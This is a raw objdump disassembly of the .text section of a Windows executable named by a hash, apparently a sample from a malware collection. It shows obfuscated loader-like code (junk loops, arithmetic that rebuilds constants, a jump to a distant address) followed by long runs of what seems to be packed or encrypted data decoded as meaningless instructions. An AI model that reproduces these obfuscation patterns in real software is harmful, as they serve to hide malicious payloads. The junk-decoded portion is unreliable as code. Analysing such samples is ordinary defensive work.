
e4708554c518df9a32d443513a23e475c387e827b5205e6fec4b1294362e2a49.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x90
  401009:	push   esi
  40100a:	and    DWORD PTR ds:0x42a010,0x0
  401014:	jmp    0x401024
  401019:	mov    eax,ds:0x42a010
  40101e:	inc    eax
  40101f:	mov    ds:0x42a010,eax
  401024:	cmp    DWORD PTR ds:0x42a010,0x1d
  40102b:	jae    0x401072
  401031:	cmp    DWORD PTR ds:0x42a010,0xc
  401038:	jne    0x40104c
  40103e:	push   0x42900c
  401043:	push   DWORD PTR [ebp-0x18]
  401046:	call   DWORD PTR ds:0x424014
  40104c:	cmp    DWORD PTR ds:0x42a010,0xb
  401053:	jne    0x401067
  401059:	xor    eax,eax
  40105b:	xor    eax,DWORD PTR ds:0x42a010
  401061:	inc    eax
  401062:	mov    ds:0x42a010,eax
  401067:	jmp    0x401019
  40106c:	adc    ecx,0xcd5
  401072:	push   edi
  401073:	mov    DWORD PTR ds:0x42b004,0x1e
  40107d:	cmp    DWORD PTR ds:0x42b004,0x0
  401084:	je     0x4010e3
  40108a:	cmp    DWORD PTR ds:0x42b004,0x2b
  401091:	jne    0x4010bf
  401097:	push   DWORD PTR [ebp-0x10]
  40109a:	push   0x42b010
  40109f:	push   0x2447
  4010a4:	push   0x42b00c
  4010a9:	push   0x8949
  4010ae:	push   DWORD PTR [ebp-0x14]
  4010b1:	push   DWORD PTR [ebp-0x10]
  4010b4:	push   0x13a5
  4010b9:	call   DWORD PTR ds:0x424018
  4010bf:	xor    esi,esi
  4010c1:	or     esi,DWORD PTR ds:0x42b004
  4010c7:	dec    esi
  4010c8:	mov    DWORD PTR ds:0x42b004,esi
  4010ce:	jmp    0x40107d
  4010d3:	mov    eax,ds:0x42a004
  4010d8:	adc    eax,DWORD PTR ds:0x42b00c
  4010de:	mov    ds:0x42a004,eax
  4010e3:	mov    eax,ds:0x421c66
  4010e8:	mov    DWORD PTR [ebp-0x2c],eax
  4010eb:	and    DWORD PTR ds:0x428010,0x0
  4010f5:	mov    ecx,DWORD PTR ds:0x428010
  4010fb:	inc    ecx
  4010fc:	mov    DWORD PTR ds:0x428010,ecx
  401102:	cmp    DWORD PTR ds:0x428010,0x2d
  401109:	jne    0x401118
  40110f:	push   DWORD PTR [ebp-0xc]
  401112:	call   DWORD PTR ds:0x42401c
  401118:	cmp    DWORD PTR ds:0x428010,0x1f
  40111f:	jb     0x4010f5
  401125:	mov    eax,ds:0x421d72
  40112a:	and    DWORD PTR ds:0x42b008,ebx
  401130:	mov    DWORD PTR [ebp-0x3c],eax
  401133:	sbb    DWORD PTR ds:0x42b010,ebx
  401139:	and    DWORD PTR [ebp-0x34],0x0
  40113d:	or     eax,0x2114
  401142:	mov    DWORD PTR [ebp-0x20],0xf89c85b6
  401149:	xor    eax,eax
  40114b:	or     eax,DWORD PTR ds:0x429008
  401151:	xor    DWORD PTR ds:0x428008,eax
  401157:	mov    DWORD PTR [ebp-0x30],0xf89c85b5
  40115e:	mov    eax,DWORD PTR [ebp-0x1c]
  401161:	add    edi,DWORD PTR ds:0x429008
  401167:	mov    ecx,DWORD PTR [ebp-0x1c]
  40116a:	add    edi,esi
  40116c:	xor    eax,ecx
  40116e:	add    DWORD PTR ds:0x428024,edx
  401174:	mov    DWORD PTR [ebp-0x1c],eax
  401177:	and    DWORD PTR ds:0x42c000,0x0
  401181:	xor    eax,eax
  401183:	or     eax,DWORD PTR ds:0x42c000
  401189:	inc    eax
  40118a:	mov    ds:0x42c000,eax
  40118f:	cmp    DWORD PTR ds:0x42c000,0x19
  401196:	jne    0x4011a8
  40119c:	push   DWORD PTR [ebp-0x1c]
  40119f:	push   DWORD PTR [ebp-0xc]
  4011a2:	call   DWORD PTR ds:0x424020
  4011a8:	cmp    DWORD PTR ds:0x42c000,0x14
  4011af:	jb     0x401181
  4011b5:	or     DWORD PTR [ebp-0x1c],0xf89cb5b6
  4011bc:	xor    DWORD PTR ds:0x428014,0x3e14
  4011c6:	mov    eax,DWORD PTR [ebp-0x28]
  4011c9:	sbb    edi,ecx
  4011cb:	mov    ecx,DWORD PTR [ebp-0x28]
  4011ce:	and    DWORD PTR ds:0x42a008,0x0
  4011d8:	mov    esi,DWORD PTR ds:0x42a008
  4011de:	inc    esi
  4011df:	mov    DWORD PTR ds:0x42a008,esi
  4011e5:	cmp    DWORD PTR ds:0x42a008,0x7
  4011ec:	jne    0x40121a
  4011f2:	push   0x42b018
  4011f7:	push   0x2bd6
  4011fc:	push   DWORD PTR [ebp-0x14]
  4011ff:	push   0x428004
  401204:	push   DWORD PTR [ebp-0x20]
  401207:	push   0x4237f2
  40120c:	push   0x1e5d
  401211:	push   DWORD PTR [ebp-0x28]
  401214:	call   DWORD PTR ds:0x424024
  40121a:	cmp    DWORD PTR ds:0x42a008,0x6
  401221:	jne    0x401234
  401227:	mov    esi,DWORD PTR ds:0x42a008
  40122d:	inc    esi
  40122e:	mov    DWORD PTR ds:0x42a008,esi
  401234:	cmp    DWORD PTR ds:0x42a008,0x16
  40123b:	jb     0x4011d8
  401241:	sub    DWORD PTR ds:0x42c00c,0x2ac6
  40124b:	xor    eax,ecx
  40124d:	dec    ecx
  40124e:	mov    DWORD PTR [ebp-0x28],eax
  401251:	and    DWORD PTR ds:0x428018,0x0
  40125b:	jmp    0x40126d
  401260:	mov    edi,DWORD PTR ds:0x428018
  401266:	inc    edi
  401267:	mov    DWORD PTR ds:0x428018,edi
  40126d:	cmp    DWORD PTR ds:0x428018,0x1f
  401274:	jae    0x4012b7
  40127a:	cmp    DWORD PTR ds:0x428018,0x11
  401281:	jne    0x401298
  401287:	push   0x4738
  40128c:	push   DWORD PTR [ebp-0x10]
  40128f:	push   DWORD PTR [ebp-0x24]
  401292:	call   DWORD PTR ds:0x424028
  401298:	cmp    DWORD PTR ds:0x428018,0x10
  40129f:	jne    0x4012b2
  4012a5:	mov    edi,DWORD PTR ds:0x428018
  4012ab:	inc    edi
  4012ac:	mov    DWORD PTR ds:0x428018,edi
  4012b2:	jmp    0x401260
  4012b7:	add    DWORD PTR [ebp-0x28],0xf89f05b6
  4012be:	mov    eax,DWORD PTR [ebp-0x18]
  4012c1:	and    DWORD PTR ds:0x428020,0x0
  4012cb:	mov    ecx,DWORD PTR ds:0x428020
  4012d1:	inc    ecx
  4012d2:	mov    DWORD PTR ds:0x428020,ecx
  4012d8:	cmp    DWORD PTR ds:0x428020,0x15
  4012df:	jne    0x4012f5
  4012e5:	push   0x4238b9
  4012ea:	push   0x42393d
  4012ef:	call   DWORD PTR ds:0x424030
  4012f5:	cmp    DWORD PTR ds:0x428020,0x14
  4012fc:	jb     0x4012cb
  401302:	mov    ecx,DWORD PTR [ebp-0x18]
  401305:	and    DWORD PTR ds:0x42b000,0x0
  40130f:	jmp    0x401321
  401314:	mov    edi,DWORD PTR ds:0x42b000
  40131a:	inc    edi
  40131b:	mov    DWORD PTR ds:0x42b000,edi
  401321:	cmp    DWORD PTR ds:0x42b000,0x19
  401328:	jae    0x401378
  40132e:	cmp    DWORD PTR ds:0x42b000,0xa
  401335:	jne    0x401359
  40133b:	push   DWORD PTR [ebp-0x18]
  40133e:	push   0x3609
  401343:	push   DWORD PTR [ebp-0xc]
  401346:	push   DWORD PTR [ebp-0x18]
  401349:	push   0x6b70
  40134e:	push   0x42901c
  401353:	call   DWORD PTR ds:0x424038
  401359:	cmp    DWORD PTR ds:0x42b000,0x9
  401360:	jne    0x401373
  401366:	mov    edi,DWORD PTR ds:0x42b000
  40136c:	inc    edi
  40136d:	mov    DWORD PTR ds:0x42b000,edi
  401373:	jmp    0x401314
  401378:	xor    eax,ecx
  40137a:	mov    DWORD PTR [ebp-0x18],eax
  40137d:	add    DWORD PTR [ebp-0x18],0xf89c85f6
  401384:	mov    eax,DWORD PTR [ebp-0x24]
  401387:	mov    ecx,DWORD PTR [ebp-0x24]
  40138a:	xor    eax,ecx
  40138c:	mov    DWORD PTR [ebp-0x24],eax
  40138f:	add    DWORD PTR [ebp-0x24],0xf89c85d6
  401396:	mov    eax,DWORD PTR [ebp-0x14]
  401399:	mov    ecx,DWORD PTR [ebp-0x14]
  40139c:	xor    eax,ecx
  40139e:	mov    DWORD PTR [ebp-0x14],eax
  4013a1:	mov    eax,DWORD PTR [ebp-0x20]
  4013a4:	mov    ecx,DWORD PTR [ebp-0x14]
  4013a7:	mov    esi,0x7510893
  4013ac:	xor    eax,esi
  4013ae:	mov    edi,0x3272db
  4013b3:	add    eax,edi
  4013b5:	xor    eax,ecx
  4013b7:	mov    DWORD PTR [ebp-0x14],eax
  4013ba:	mov    eax,DWORD PTR [ebp-0x10]
  4013bd:	mov    ecx,DWORD PTR [ebp-0x10]
  4013c0:	sub    eax,ecx
  4013c2:	mov    DWORD PTR [ebp-0x10],eax
  4013c5:	add    DWORD PTR [ebp-0x10],0xf89c85b9
  4013cc:	mov    al,BYTE PTR [ebp-0x1]
  4013cf:	movzx  ecx,BYTE PTR [ebp-0x1]
  4013d3:	movzx  eax,al
  4013d6:	sub    ecx,eax
  4013d8:	mov    BYTE PTR [ebp-0x1],cl
  4013db:	movzx  eax,BYTE PTR [ebp-0x1]
  4013df:	xor    eax,0xffffff99
  4013e2:	mov    BYTE PTR [ebp-0x1],al
  4013e5:	mov    eax,DWORD PTR [ebp-0x20]
  4013e8:	xor    eax,esi
  4013ea:	add    eax,edi
  4013ec:	mov    DWORD PTR [ebp-0x14],eax
  4013ef:	lea    eax,[ebp-0x40]
  4013f2:	mov    DWORD PTR [ebp-0x38],eax
  4013f5:	lea    eax,[ebp-0x38]
  4013f8:	mov    DWORD PTR [ebp-0x44],eax
  4013fb:	lea    eax,[ebp-0x44]
  4013fe:	mov    DWORD PTR [ebp-0x8],eax
  401401:	lea    eax,[ebp-0x8]
  401404:	mov    DWORD PTR [ebp-0x48],eax
  401407:	mov    eax,DWORD PTR [ebp-0x18]
  40140a:	xor    eax,esi
  40140c:	add    eax,edi
  40140e:	push   eax
  40140f:	mov    eax,DWORD PTR [ebp-0x1c]
  401412:	xor    eax,esi
  401414:	add    eax,edi
  401416:	push   eax
  401417:	mov    eax,DWORD PTR [ebp-0x10]
  40141a:	xor    eax,esi
  40141c:	add    eax,edi
  40141e:	push   eax
  40141f:	lea    eax,[ebp-0x90]
  401425:	push   eax
  401426:	push   DWORD PTR [ebp-0x20]
  401429:	push   DWORD PTR [ebp-0x30]
  40142c:	jmp    0x4037ee
  401431:	mov    al,0x4c
  401433:	cmp    BYTE PTR [edx+0x44b086b4],cl
  401439:	ss ins DWORD PTR es:[edi],dx
  40143b:	dec    edi
  40143c:	clc    
  40143d:	mov    ch,0xc5
  40143f:	mov    al,ds:0x62626209
  401444:	(bad)  
  401445:	fstp   QWORD PTR [edi+0x62]
  401448:	bound  ecx,QWORD PTR [ecx]
  40144a:	sub    DWORD PTR [edi],eax
  40144c:	pop    eax
  40144d:	add    eax,0x792e0358
  401452:	pop    ecx
  401453:	jne    0x40149a
  401455:	mov    ebp,0x7142722f
  40145a:	daa    
  40145b:	into   
  40145c:	push   eax
  40145d:	hlt    
  40145e:	and    al,0xd4
  401460:	xchg   ecx,eax
  401461:	fbstp  TBYTE PTR ds:0x1153c2c8
  401467:	icebp  
  401468:	aaa    
  401469:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40146a:	add    DWORD PTR [edx-0x9],ebx
  40146d:	mov    al,ds:0xb465e64e
  401472:	in     al,dx
  401473:	(bad)  
  401474:	pop    eax
  401475:	cmp    esi,esi
  401477:	pushf  
  401478:	mov    ds:0x6b01003,eax
  40147d:	add    DWORD PTR [ebx-0x153fb6cb],0xa
  401484:	(bad)  
  401485:	scas   al,BYTE PTR es:[edi]
  401486:	sahf   
  401487:	test   eax,0x86999f74
  40148c:	js     0x4014a2
  40148e:	iret   
  40148f:	mov    edx,0xac6df4d7
  401494:	test   eax,0xdc9e713b
  401499:	xlat   BYTE PTR ds:[ebx]
  40149a:	rcr    BYTE PTR [esi+ebp*4+0x44a3fedb],0xc2
  4014a2:	aam    0x3
  4014a4:	dec    ebx
  4014a5:	std    
  4014a6:	mov    al,0x60
  4014a8:	in     eax,dx
  4014a9:	fbstp  TBYTE PTR [edx+0x7a8c4260]
  4014af:	push   ds
  4014b0:	pusha  
  4014b1:	stc    
  4014b2:	mov    al,ds:0x958913e5
  4014b7:	cmp    eax,0x95de469d
  4014bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4014bd:	loope  0x4014a5
  4014bf:	ret    0xfb84
  4014c2:	push   ecx
  4014c3:	sub    eax,0x8f09f6d7
  4014c8:	(bad)  
  4014c9:	jmp    0x36a88a81
  4014ce:	pop    eax
  4014cf:	or     cl,dh
  4014d1:	inc    edx
  4014d2:	ins    BYTE PTR es:[edi],dx
  4014d3:	stos   BYTE PTR es:[edi],al
  4014d4:	cdq    
  4014d5:	aad    0x77
  4014d7:	dec    edi
  4014d8:	pop    edi
  4014d9:	xor    DWORD PTR [ebp-0x3051591a],edx
  4014df:	test   eax,0x67fbb6c2
  4014e4:	mov    edx,0x53fb3792
  4014e9:	rcr    BYTE PTR [ecx],cl
  4014eb:	out    dx,al
  4014ec:	pop    edx
  4014ed:	idiv   dl
  4014ef:	xor    al,cl
  4014f1:	lods   al,BYTE PTR ds:[esi]
  4014f2:	inc    esi
  4014f3:	xor    DWORD PTR [ecx+edi*4+0x13356d7f],ecx
  4014fa:	cmc    
  4014fb:	jne    0x4014ab
  4014fd:	push   cs
  4014fe:	push   0x3f96bf88
  401503:	xchg   edx,eax
  401504:	add    BYTE PTR [eax+eax*1-0x103211bd],dh
  40150b:	loop   0x40155b
  40150d:	jmp    0x1cbc97f3
  401512:	cdq    
  401513:	aam    0x16
  401515:	daa    
  401516:	pop    edx
  401517:	in     al,0x58
  401519:	idiv   BYTE PTR [eax]
  40151b:	or     DWORD PTR ss:[ebx-0x15],0xf9c76e5b
  401523:	inc    ebp
  401524:	call   0xf60e:0x4ade8c6b
  40152b:	(bad)  
  40152d:	les    eax,FWORD PTR [eax+0x403d0189]
  401533:	cs xor eax,0x9c337556
  401539:	mov    al,BYTE PTR [esi-0x2e]
  40153c:	push   ecx
  40153d:	add    bh,ch
  40153f:	and    bl,cl
  401541:	push   ebx
  401542:	dec    ebx
  401543:	(bad)  
  401544:	xchg   edi,eax
  401545:	mov    edx,ebx
  401547:	jmp    0x4015a5
  401549:	mov    ebx,0xb0308a00
  40154e:	dec    edx
  40154f:	mov    ebx,0x1f242a2f
  401554:	push   ebx
  401555:	repz adc dh,BYTE PTR [ebx-0x3cc5b133]
  40155c:	in     al,0x65
  40155e:	pop    ebx
  40155f:	xchg   ebp,eax
  401560:	push   eax
  401561:	mov    eax,0xdd27355
  401566:	mov    ah,0xc7
  401568:	aaa    
  401569:	int    0x1c
  40156b:	push   cs
  40156c:	ins    DWORD PTR es:[edi],dx
  40156d:	sbb    edx,DWORD PTR ds:0x58a63f51
  401573:	inc    edi
  401574:	mov    ds:0x62a61f59,al
  401579:	(bad)  
  40157b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40157c:	in     al,dx
  40157d:	push   esp
  40157e:	and    dl,cl
  401580:	ror    edx,0xcc
  401583:	and    DWORD PTR [esp+ebp*2+0x27],ecx
  401587:	ror    DWORD PTR [eax-0x3799870a],cl
  40158d:	jp     0x40157d
  40158f:	cmp    al,0x16
  401591:	push   eax
  401592:	jno    0x40158a
  401594:	arpl   WORD PTR [edi-0x31],di
  401597:	popa   
  401598:	ja     0x4015e1
  40159a:	sar    ch,1
  40159c:	inc    ecx
  40159d:	inc    esp
  40159e:	and    dh,BYTE PTR [edx+0x50]
  4015a1:	mov    BYTE PTR [ebx+0x1628abd9],ah
  4015a7:	inc    ebx
  4015a8:	pushf  
  4015a9:	adc    DWORD PTR [ecx-0x62e3aec6],esi
  4015af:	aaa    
  4015b0:	sti    
  4015b1:	jne    0x4015a7
  4015b3:	push   ecx
  4015b4:	aas    
  4015b5:	cwde   
  4015b6:	clc    
  4015b7:	adc    al,0x4f
  4015b9:	dec    ecx
  4015ba:	ret    0x5b4
  4015bd:	jp     0x401604
  4015bf:	aas    
  4015c0:	pop    esi
  4015c1:	js     0x40158b
  4015c3:	dec    edi
  4015c4:	enter  0x339d,0xc3
  4015c8:	clc    
  4015c9:	jae    0x401613
  4015cb:	xchg   ecx,eax
  4015cc:	dec    ebp
  4015cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4015ce:	mov    al,0xd0
  4015d0:	lods   eax,DWORD PTR ds:[esi]
  4015d1:	jbe    0x40158d
  4015d3:	adc    BYTE PTR [ebp+0x347850e2],ah
  4015d9:	push   0xffffff99
  4015db:	mov    al,ds:0xb4dcbe4
  4015e0:	ds inc edi
  4015e2:	cmp    bh,BYTE PTR [edi+0x4a6ebe4e]
  4015e8:	gs jb  0x4015f1
  4015eb:	adc    cl,bh
  4015ed:	das    
  4015ee:	ret    0x4115
  4015f1:	sub    dl,bh
  4015f3:	fyl2xp1 
  4015f5:	aad    0xed
  4015f7:	add    eax,DWORD PTR [ebp+0x19435cf3]
  4015fd:	jns    0x401584
  4015ff:	imul   ebx,DWORD PTR [esi],0xc
  401602:	mov    al,ds:0x176ff2c5
  401607:	mov    dl,BYTE PTR [eax]
  401609:	lods   eax,DWORD PTR ds:[esi]
  40160a:	push   ecx
  40160b:	push   ss
  40160c:	and    BYTE PTR [ebp+ebx*1+0x32],dh
  401610:	adc    BYTE PTR [eax-0x3b213b96],0x6b
  401617:	and    ebp,esp
  401619:	fisttp QWORD PTR [edx+edx*8-0x3cf17235]
  401620:	adc    al,0xf7
  401622:	test   DWORD PTR [edx-0x18f33953],eax
  401628:	imul   bp,WORD PTR [esi],0x39
  40162c:	pop    esp
  40162d:	jne    0x401686
  40162f:	xchg   edi,eax
  401630:	jmp    0x7a0a9265
  401635:	xchg   esi,eax
  401636:	fmulp  st(2),st
  401638:	or     ch,BYTE PTR [ebp-0x5e733024]
  40163e:	mov    ?,WORD PTR [bp+si]
  401641:	sar    ebx,cl
  401643:	loop   0x40168f
  401645:	jmp    0xbddcd644
  40164a:	xchg   esi,eax
  40164b:	push   edi
  40164c:	(bad)  
  40164d:	jno    0x40163a
  40164f:	je     0x401692
  401651:	push   cs
  401652:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401653:	mov    esi,0x1d3b4c67
  401658:	cmp    DWORD PTR [ecx],ecx
  40165a:	sbb    al,0xd1
  40165c:	imul   eax,ebp,0xffffffcf
  40165f:	xor    edx,ebx
  401661:	cmp    edi,DWORD PTR [ebx+ebp*4]
  401664:	or     BYTE PTR [edi+0x36e9e810],0x30
  40166b:	push   cs
  40166c:	mov    WORD PTR [edx],fs
  40166e:	push   ss
  40166f:	(bad)  
  401670:	in     al,0x14
  401672:	lds    edx,FWORD PTR [esi+edx*8-0x13ac0fdf]
  401679:	lahf   
  40167a:	fiadd  DWORD PTR [eax-0x3f]
  40167d:	sub    BYTE PTR [edi+0x2c],ch
  401680:	push   esi
  401681:	test   DWORD PTR [eax*8-0x5d4a3324],ecx
  401688:	mov    eax,ds:0xe0353479
  40168d:	das    
  40168e:	or     al,0xdb
  401690:	pusha  
  401691:	shl    edx,0xf6
  401694:	add    DWORD PTR [eax-0x5],ebx
  401697:	outs   dx,DWORD PTR ds:[esi]
  401698:	inc    eax
  401699:	outs   dx,BYTE PTR ds:[esi]
  40169a:	mov    esp,0x14b4b99f
  40169f:	xlat   BYTE PTR ds:[ebx]
  4016a0:	sbb    ebp,DWORD PTR [ebp-0x799a0581]
  4016a6:	add    al,0x63
  4016a8:	jno    0x40169b
  4016aa:	int3   
  4016ab:	ret    
  4016ac:	inc    esi
  4016ad:	test   eax,0x5e797599
  4016b2:	out    0x62,al
  4016b4:	int    0xce
  4016b6:	daa    
  4016b7:	sar    edi,0x2c
  4016ba:	test   eax,0x26bad54
  4016bf:	or     eax,DWORD PTR [ebp+0x4b47ddf9]
  4016c5:	pop    edx
  4016c6:	imul   dh
  4016c8:	lods   eax,DWORD PTR ds:[esi]
  4016c9:	xlat   BYTE PTR ds:[ebx]
  4016ca:	ja     0x4016e4
  4016cc:	xchg   esp,ecx
  4016ce:	mov    ah,cl
  4016d0:	mov    ah,0xa2
  4016d2:	enter  0x4ef6,0x25
  4016d6:	sahf   
  4016d7:	nop
  4016d8:	push   es
  4016d9:	outs   dx,BYTE PTR ds:[esi]
  4016da:	pop    esp
  4016db:	icebp  
  4016dc:	jp     0x4016a2
  4016de:	inc    ebx
  4016df:	and    ch,ah
  4016e1:	push   0x76c3a95e
  4016e6:	add    ebp,esi
  4016e8:	or     ch,BYTE PTR [ebx]
  4016ea:	mov    bh,dl
  4016ec:	mov    bh,BYTE PTR [ebx-0x3a]
  4016ef:	inc    esp
  4016f0:	loop   0x4016e5
  4016f2:	fwait
  4016f3:	or     al,0xac
  4016f5:	ins    BYTE PTR es:[edi],dx
  4016f6:	add    ebp,esi
  4016f8:	jle    0x401710
  4016fa:	js     0x401710
  4016fc:	and    al,0xc2
  4016fe:	sub    ch,0x67
  401701:	mov    bh,0x20
  401703:	inc    eax
  401704:	dec    ebx
  401705:	pop    ebx
  401706:	(bad)  
  401707:	mov    ecx,0xf3143a02
  40170c:	jo     0x401734
  40170e:	dec    esp
  40170f:	pop    eax
  401710:	jo     0x4016be
  401712:	cs clc 
  401714:	out    0x30,eax
  401716:	inc    edx
  401717:	pop    ds
  401718:	jg     0x4016b4
  40171a:	stc    
  40171b:	push   esp
  40171c:	in     eax,dx
  40171d:	adc    dl,BYTE PTR [edi+0x2f]
  401720:	jp     0x401724
  401722:	scas   al,BYTE PTR es:[edi]
  401723:	fisttp DWORD PTR [esi]
  401725:	xchg   esp,eax
  401726:	test   BYTE PTR [edi-0x21],0x68
  40172a:	pusha  
  40172b:	cdq    
  40172c:	push   ds
  40172d:	adc    BYTE PTR [eax-0x58143d67],ch
  401733:	fnstenv [eax+ebx*2-0x47]
  401737:	mov    ebp,0x40500ce0
  40173c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40173d:	stos   BYTE PTR es:[edi],al
  40173e:	sbb    DWORD PTR [ebx-0x52adddac],0xffffffad
  401745:	lods   al,BYTE PTR ds:[esi]
  401746:	xchg   ebp,eax
  401747:	push   edi
  401748:	pushf  
  401749:	test   al,0x28
  40174b:	leave  
  40174c:	pop    es
  40174d:	cli    
  40174e:	ins    DWORD PTR es:[edi],dx
  40174f:	icebp  
  401750:	sbb    al,0x84
  401752:	jns    0x4016f8
  401754:	mov    BYTE PTR [esi+0x71bd8435],dh
  40175a:	pop    ds
  40175b:	mov    ch,BYTE PTR [eax+eax*1+0x5a]
  40175f:	call   0x2ddb:0x7706a4de
  401766:	dec    edx
  401767:	dec    ebx
  401768:	pop    ebx
  401769:	cld    
  40176a:	in     al,dx
  40176b:	dec    eax
  40176c:	pop    eax
  40176d:	gs lock cmc 
  401770:	jl     0x40170f
  401772:	in     al,0x46
  401774:	sub    BYTE PTR [ecx-0x36c9396b],ch
  40177a:	shr    BYTE PTR [edi-0x7e],1
  40177d:	and    eax,0x906b3597
  401782:	mov    edx,0x9c6ab350
  401787:	dec    esi
  401788:	fild   QWORD PTR [esi+0x1ac946fd]
  40178e:	loopne 0x4017be
  401790:	add    DWORD PTR [ebx+0x0],eax
  401793:	fs leave 
  401795:	mov    dl,0x7f
  401797:	xor    BYTE PTR [eax-0x64],al
  40179a:	inc    ebp
  40179b:	push   0xffffff8a
  40179d:	std    
  40179e:	mov    al,0x73
  4017a0:	aam    0xbb
  4017a2:	inc    esi
  4017a3:	and    al,0x7a
  4017a5:	pop    edx
  4017a6:	sbb    dl,0x62
  4017a9:	sbb    eax,0x38d18046
  4017ae:	mov    ebx,0x6586915f
  4017b3:	lahf   
  4017b4:	mov    ah,0x3a
  4017b6:	jne    0x40179e
  4017b8:	pushf  
  4017b9:	and    BYTE PTR [ecx],dh
  4017bb:	mov    ebx,0xee3d518c
  4017c0:	pop    edi
  4017c1:	xchg   edi,eax
  4017c2:	push   edi
  4017c3:	cmp    DWORD PTR [ebx],esi
  4017c5:	push   ss
  4017c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4017c7:	scas   eax,DWORD PTR es:[edi]
  4017c8:	and    DWORD PTR [ebx],esp
  4017ca:	push   edi
  4017cb:	stos   BYTE PTR es:[edi],al
  4017cc:	and    al,0x3a
  4017ce:	(bad)  
  4017cf:	jge    0x401817
  4017d1:	les    esp,FWORD PTR [eax]
  4017d3:	pop    eax
  4017d4:	ret    
  4017d5:	jns    0x4017a1
  4017d7:	jne    0x401812
  4017d9:	adc    BYTE PTR ds:0xdf2e2bbc,dl
  4017df:	into   
  4017e0:	pop    edx
  4017e1:	xchg   ebp,eax
  4017e2:	repz leave 
  4017e4:	lahf   
  4017e5:	ja     0x401768
  4017e7:	or     ebp,0xb56b7f33
  4017ed:	(bad)  
  4017ee:	fs xchg esp,eax
  4017f0:	dec    esp
  4017f1:	push   esi
  4017f2:	arpl   WORD PTR [edi+eax*1],sp
  4017f5:	jle    0x4017a0
  4017f7:	test   ebp,edi
  4017f9:	dec    ebp
  4017fa:	jne    0x40178f
  4017fc:	(bad)  
  4017fd:	(bad)  
  4017ff:	pop    es
  401800:	lock test ax,0xb4d9
  401805:	add    eax,0xf9bb4fcb
  40180a:	sahf   
  40180b:	xor    BYTE PTR [edi+0x73],cl
  40180e:	jb     0x40185f
  401810:	xchg   esp,eax
  401811:	adc    DWORD PTR [edx],0x654c262f
  401817:	aas    
  401818:	out    dx,eax
  401819:	or     al,0x29
  40181b:	scas   eax,DWORD PTR es:[edi]
  40181c:	test   eax,0x572379ae
  401821:	sbb    al,0x9d
  401823:	add    eax,0x480b913
  401828:	cwde   
  401829:	mov    eax,0x6df9bfb2
  40182e:	stos   BYTE PTR es:[edi],al
  40182f:	mov    edx,0x24a293cd
  401834:	lock dec edx
  401836:	push   edx
  401837:	mov    al,0xe9
  401839:	adc    DWORD PTR [esi],0x8f427914
  40183f:	dec    esp
  401840:	mov    cl,0xb1
  401842:	push   ds
  401843:	mov    ebx,0x914625bb
  401848:	scas   al,BYTE PTR es:[edi]
  401849:	mov    edi,0xbc9d34f0
  40184e:	dec    ebp
  40184f:	loope  0x401806
  401851:	fmul   DWORD PTR [ebx+ebx*2-0x5e14f1c5]
  401858:	jnp    0x4017e5
  40185a:	sub    al,BYTE PTR [edi-0x23f41e32]
  401860:	cmp    esi,DWORD PTR [edi-0x6d]
  401863:	ins    BYTE PTR es:[edi],dx
  401864:	popf   
  401865:	cmp    bl,BYTE PTR [ecx]
  401867:	in     al,0x3
  401869:	add    al,0x43
  40186b:	xchg   BYTE PTR [ecx],ah
  40186d:	xchg   esp,eax
  40186e:	lock inc esi
  401870:	jae    0x4018c7
  401872:	gs jb  0x401890
  401875:	repz test al,0x6
  401878:	pop    esi
  401879:	jno    0x401840
  40187b:	pop    ds
  40187c:	or     bh,BYTE PTR [edx]
  40187e:	pop    ebp
  40187f:	add    al,0xa1
  401881:	mov    ebp,0x6786d7d3
  401886:	mov    ebp,0xfd5396b7
  40188b:	inc    edi
  40188c:	dec    eax
  40188d:	fcom   DWORD PTR fs:[ebx-0x54]
  401891:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401892:	jp     0x4018ca
  401894:	push   ds
  401895:	sbb    esi,DWORD PTR ds:0xda2f8ebc
  40189b:	iret   
  40189c:	or     DWORD PTR [edi+esi*8+0x46],ebx
  4018a0:	mov    edx,0xf97451a6
  4018a5:	cmp    BYTE PTR [edx-0x5e],bl
  4018a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4018a9:	dec    esi
  4018aa:	aam    0x9c
  4018ac:	fbstp  TBYTE PTR [edi-0x4e]
  4018af:	ds mov al,0xa8
  4018b2:	xor    esp,DWORD PTR [eax]
  4018b4:	and    BYTE PTR [edi-0x7835d7a2],dh
  4018ba:	add    al,BYTE PTR [ebx+0x452d4ac9]
  4018c0:	and    DWORD PTR [eax+0x15],edi
  4018c3:	fimul  WORD PTR [ebx+0x2317d5e9]
  4018c9:	ins    DWORD PTR es:[edi],dx
  4018ca:	jmp    0xc2ff2778
  4018cf:	xchg   edi,eax
  4018d0:	inc    ebx
  4018d1:	ror    DWORD PTR [ebx],0x90
  4018d4:	jl     0x401917
  4018d6:	mov    ebx,0x10d5d49a
  4018db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4018dc:	aam    0x19
  4018de:	data16 and al,0xd4
  4018e1:	add    dl,BYTE PTR [ecx]
  4018e3:	mov    dl,0x19
  4018e5:	rcr    esp,1
  4018e7:	add    edi,DWORD PTR [edi+0x67ddd7e2]
  4018ed:	inc    ebx
  4018ee:	mov    eax,0x970011b2
  4018f3:	dec    ecx
  4018f4:	adc    dl,BYTE PTR [edx-0x3c60942f]
  4018fa:	fldcw  WORD PTR [edi-0x63]
  4018fd:	jne    0x401886
  4018ff:	push   eax
  401900:	add    DWORD PTR [esi+0x31],0x2ee26909
  401907:	inc    ebp
  401908:	mov    al,ds:0xafbb172c
  40190d:	jmp    0x79ba:0xa8ac026
  401914:	cmp    al,0x53
  401916:	inc    edi
  401917:	mov    ecx,0x3b81c87c
  40191c:	jno    0x401910
  40191e:	adc    eax,esi
  401920:	sub    ebp,ecx
  401922:	cmp    edi,DWORD PTR [eax-0x58]
  401925:	jmp    0x4fa086ea
  40192a:	or     eax,0x3e6d95a7
  40192f:	jns    0x401904
  401931:	push   esi
  401932:	jg     0x40191f
  401934:	lahf   
  401935:	jno    0x401989
